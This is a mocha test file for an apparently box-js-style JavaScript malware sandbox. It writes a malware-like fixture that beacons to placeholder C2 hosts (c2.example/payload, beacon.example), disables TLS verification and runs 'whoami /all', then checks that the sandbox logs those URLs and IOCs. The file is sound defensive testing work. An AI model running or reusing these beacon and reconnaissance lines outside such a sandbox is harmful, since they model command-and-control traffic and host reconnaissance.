/* eslint-env mocha */

// require_override.js (loaded with --prepended-code=default) stubs node modules; ids it
// does not stub now fail inside the sandbox instead of reaching the host's real modules.

const assert = require("assert");
const {execFileSync} = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const boxDir = path.join(__dirname, "..");

describe("require_override stubs", function() {
	this.timeout(90000);
	let urls, iocs, work;
	before(function() {
		work = fs.mkdtempSync(path.join(os.tmpdir(), "boxjs-override-"));
		const sample = path.join(work, "sample.js");
		fs.writeFileSync(sample, [
			"try { require(\"https\").request({hostname: \"tls.example\", port: 443, path: \"/a\"}); } catch (e) {}",
			"try { require(\"node:https\").request({hostname: \"tls2.example\", port: 8443, path: \"/b\"}); } catch (e) {}",
			"try { require(\"https\").request(new (require(\"url\").URL)(\"https://c2.example/payload?a=1\")); } catch (e) {}",
			"try { require(\"https\").request({hostname: \"tls3.example\", port: \"\", pathname: \"/c\", search: \"?q\"}); } catch (e) {}",
			"try { require(\"node:child_process\").execSync(\"whoami /all\"); } catch (e) {}",
			// No try/catch: a beacon must not end the analysis.
			"var req = require(\"https\").request({hostname: \"beacon.example\", path: \"/c\", method: \"POST\"}, function () {});",
			"req.on(\"error\", function () {}); req.write(\"x\"); req.end();",
			"require(\"child_process\").execSync(\"after beacon\");",
			// A promise-wrapped request settles through the emulated "error".
			"new Promise(function (res, rej) { var r = require(\"https\").request({host: \"hostopt.example:8443\", path: \"/p\"}); r.on(\"error\", rej); r.end(); })",
			"  .catch(function () { require(\"child_process\").execSync(\"after rejection\"); });",
			"var agent = new (require(\"https\").Agent)({rejectUnauthorized: false});",
			"var g = require(\"https\").get(new URL(\"https://get.example/g?x=1\"), function () {}); g.on(\"error\", function () {}); g.setTimeout(5000, function () { g.destroy(); });",
			"require(\"https\").request(\"https://decoy.example/\", {hostname: \"real.example\", path: \"/c2\", agent: agent}, function () {}).end();",
			"",
		].join("\n"));
		try {
			execFileSync(process.execPath, [path.join(boxDir, "run.js"), sample, `--output-dir=${work}`,
				"--no-kill", "--timeout=20", "--prepended-code=default", "--no-shell-error"],
			{cwd: work, stdio: "ignore", timeout: 60000});
		} catch (e) {}
		const results = path.join(work, "sample.js.results");
		urls = JSON.parse(fs.readFileSync(path.join(results, "urls.json"), "utf8"));
		iocs = JSON.parse(fs.readFileSync(path.join(results, "IOC.json"), "utf8"));
	});
	after(function() {
		fs.rmSync(work, {recursive: true, force: true});
	});
	it("logs https requests with the URL node would contact", function() {
		assert.deepStrictEqual(urls, ["https://tls.example/a", "https://tls2.example:8443/b",
			"https://c2.example/payload?a=1", "https://tls3.example/c?q", "https://beacon.example/c",
			"https://hostopt.example:8443/p", "https://get.example/g?x=1", "https://real.example/c2"]);
	});
	it("keeps analysing after an https request", function() {
		assert(iocs.some((i) => i.value && i.value.command === "after beacon"), JSON.stringify(iocs.map((i) => i.type)));
	});
	it("rejects a promise-wrapped request through its error listener", function() {
		assert(iocs.some((i) => i.value && i.value.command === "after rejection"), JSON.stringify(iocs.map((i) => i.type)));
	});
	it("gives node:-prefixed ids the same stub", function() {
		assert(iocs.some((i) => i.value && i.value.command === "whoami /all"), JSON.stringify(iocs.map((i) => i.type)));
	});
});
